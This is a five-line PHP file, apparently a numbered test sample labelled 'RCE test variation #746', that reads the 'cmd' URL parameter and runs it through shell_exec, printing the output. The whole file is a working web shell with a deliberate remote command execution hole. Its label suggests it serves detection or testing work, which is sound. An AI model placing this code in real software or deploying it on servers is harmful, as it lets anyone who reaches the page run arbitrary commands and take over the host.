<?php
// RCE test variation #746
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>